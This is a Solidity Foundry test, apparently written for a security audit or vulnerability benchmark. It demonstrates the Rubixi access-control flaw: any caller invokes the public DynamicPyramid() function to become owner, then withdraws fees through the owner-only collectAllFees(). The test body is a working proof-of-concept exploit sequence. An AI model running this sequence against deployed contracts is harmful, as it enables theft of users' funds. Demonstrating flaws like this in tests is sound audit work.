
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi private rubixi;
    address private originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        rubixi = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccessDynamicPyramid(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // The vulnerability is that DynamicPyramid() can be called by anyone
        // to become the creator/owner. We don't exclude any privileged roles
        // because the point is to prove ANY arbitrary user can call it.

        // --- 2. State Configuration ---
        // Fund the contract with some fees first so we can verify ownership change
        vm.deal(address(this), 10 ether);
        (bool sent,) = address(rubixi).call{value: 1 ether}("");
        require(sent, "Failed to send ether to contract");

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);
        
        // The vulnerability: DynamicPyramid() is a public function that sets creator
        // Anyone can call it to become the owner
        rubixi.DynamicPyramid();
        
        // Verify the caller has become the owner by trying to call an onlyowner function
        // Fund the caller so they can receive the fees
        vm.deal(caller, 1 ether);
        
        // If the caller successfully became owner, they can now collect fees
        // This will succeed only if caller is now the creator
        vm.prank(caller);
        rubixi.collectAllFees();
        
        // If we reach here, the arbitrary caller successfully:
        // 1. Called DynamicPyramid() to become owner
        // 2. Called collectAllFees() which is protected by onlyowner
        // This proves the vulnerability exists
    }
}
